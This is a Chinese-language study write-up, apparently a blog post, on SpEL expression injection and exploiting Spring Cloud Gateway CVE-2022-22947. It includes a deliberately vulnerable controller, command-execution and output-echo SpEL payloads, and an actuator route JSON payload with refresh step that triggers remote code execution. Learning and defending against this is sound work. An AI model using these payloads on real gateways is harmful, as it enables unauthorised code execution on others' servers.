这篇文章的主要目的是学习一下spel表达式注入和哥斯拉内存马注入，还有神器java-object-searcher的使用
# SPEL表达式注入
  * spel支持在运行时查询和操作对象图，以API接口的形式创建，所以可以集成到其他应用程序和框架中
### spel接口
  * ExpressionParser接口：解析器
> ExpressionParser接口下的parseExpression()方法将字符串表达式转化为Expression对象
>
>   * parseExpression()接收参数：
>
>  
>  
>     Expression parseExpression(String expressionString, ParserContext
> context);
>  
>
> 其中parserContext定义了字符串表达式是否为模板，和模板开始与结束字符
我们经常看见的spel表达式以`#{xxx}`的形式出现，他的parserContext如下：
    ParserContext parserContext = new ParserContext() {
                @Override
                public boolean isTemplate() {
                    return true;
                }
                @Override
                public String getExpressionPrefix() {
                    return "#{";
                }
                @Override
                public String getExpressionSuffix() {
                    return "}";
                }
            };
  * EvaluationContext接口：表示上下文环境。以SpelExpression实现，提供getValue和setValue操作对象值
### spel语法
  * T(全限定名)表示java.lang.Class，RCE的关键，如下使用`T(java.lang.Runtime)`获取了类，并且可以直接使用类下的方法
    T(java.lang.Runtime).getRuntime().exec("calc")
  * 和java一样的关键字：new进行类实例化，instanceof判断type
    new java.lang.ProcessBuilder("calc.exe).start()
  * 变量定义和引用：
    * 变量定义：`EvaluationContext的setVariable(name,value)`
    * 引用：`#name`，还支持`#this`和`#root`
### spel Controller
pom.xml中添加依赖：
        org.springframework
        spring-expression
        xxx
创建一个controller接收字符参数
    @Controller
    public class spel {
        @RequestMapping("/spel")
        @ResponseBody
        public String spel(String input){
            SpelExpressionParser parser = new SpelExpressionParser();
            Expression expression = parser.parseExpression(input);
            return expression.getValue().toString();
        }
    }
使用spelExpressionParser接口创建解析器
    SpelExpressionParser parser = new SpelExpressionParser();
指定ExpressionParser#parseExpression()来解析表达式
    Expression expression = parser.parseExpression(input);
getValue根据上下文获得表达式
    expression.getValue().toString();
如果向该Controller HTTP传参，参数名为Input，就能进行spel解析
## spel回显
  1. `commons-io`组件回显。但是需要服务器存在该组件，一般都没有
        T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())
  1. jdk>=9时使用JShell
    T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('java payload').toString()
  1. jdk原生类BufferedReader
    new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder( "whoami").start().getInputStream(), "gbk")).readLine()
  1. scanner
    new java.util.Scanner(new java.lang.ProcessBuilder("ls").start().getInputStream(), "GBK").useDelimiter("asfsfsdfsf").next()
useDelimiter为分隔符
# Spring Cloud GateWay CVE-2022-22947
## 源码分析
Spring Cloud GateWay版本：3.1.0&
idea打开就能分析了
在`shortcutConfigurable#getValue`中，`#{}`包住的进行spel解析，这就是链最后的地方，控制entryValue即可实现spel注入
在shortcutType处使用了getValue
由于是在shortcutType中的normalize中调用的getValue()，所以找也要找调用了`shortcutType().normalize()`方法的类，ConfigurationService就符合
上文的`entry.getValue()`，entry即为第一个参数，也就是一个Map。这里控制`this.properties`为恶意map就能控制spel表达式
在`bind()`方法中触发了`normalizeProperties()`方法：
在`RouteDefinitionRouteLocator#lookup()`方法中对properties进行了设置，然后调用了bind()
properties的值为`predicate.getArgs()`
在combinePredicates中定义了predicate的值，与routeDefinition有关
在`convertToRoute()`中调用了combinePredicates()
而在路由初始化时触发convertToRoute()
    CacheingRouteLocator#onApplicationEvent()->
        CachingRouteLocator#fetch()->
            CompositeRouteLocator#getRoutes()->
                RouteDefinitionRouteLocator#getRoutes()->
                    RouteDefinitionRouteLocator#convertToRoute()
## 漏洞利用
在官方文档
Actuator API提供了Rest添加路由的方式:
>
> 要创建一个路由，请向/gateway/routes/{id_route_to_create}发出一个POST请求，该请求包含一个指定路由字段的JSON主体（见检索某个特定路由的信息）。要删除一个路由，请向/gateway/routes/{id_route_to_delete}发出一个DELETE请求。
`http://xxx/actuator/gateway/routes/{xxx}`添加路由
也就是可以向`http://xxx/actuator/gateway/routes/godown`如下payload进行注入
    {
      "id": "godown",
      "predicates": [{
        "name": "Path",
        "args": {"_genkey_0":"#{T(java.lang.Runtime).getRuntime().exec('calc')}"}
      }],
      "filters": [],
      "uri": "https://www.uri-destination.org",
      "order": 0
    }
创建完之后向`http://xxx/actuator/gateway/refresh`发送请求即可刷新
其实添加的这部分路由对应着配置文件中的route部分：
注意在创建路由的时候把content-type改为application/json
## 拓展链
上文payload里的其他参数有没有用？name为什么要是Path？
借用奇安信的一张调用栈图：
在RouteDefinitionRouteLocator#convertToRoute()方法处
除了会调用combinePredicates，还会调用getFilters来触发loadGatewayFilters进行bind
所以在filters处注入也是可以的
  * 奇安信攻防实验室对各种过滤器进行了实验，事实证明所有过滤器都可以：
> 过滤器名称：
>  
>  
>     AddRequestHeader
>     MapRequestHeader
>     AddRequestParameter
>     AddResponseHeader
>     ModifyRequestBody
>     DedupeResponseHeader
>     ModifyResponseBody
>     CacheRequestBody
>     PrefixPath
>     PreserveHostHeader
>     RedirectTo
>     RemoveRequestHeader
>     RemoveRequestParameter
>     RemoveResponseHeader
>     RewritePath
>     Retry
>     SetPath
>     SecureHeaders
>     SetRequestHeader
>     SetRequestHostHeader
>     SetResponseHeader
>     RewriteResponseHeader
>     RewriteLocationResponseHeader
>     SetStatus
>     SaveSession
>     StripPrefix
>     RequestHeaderToRequestUri
>     RequestSize
>     RequestHeaderSize
>  
payload:
    {
        "id": "first_route",
        "predicates": [],
        "filters": [{
            "name": "Retry",
            "args": 
                {
                    "name": "payload",
                    "value": "123"
                }
        }],
        "uri": "https://www.uri-destination.org",
        "order": 0
    }
修改filters.name为任意合法过滤器名，payload处改为spel表达式
同理，predicates里的name，我们之前用的Path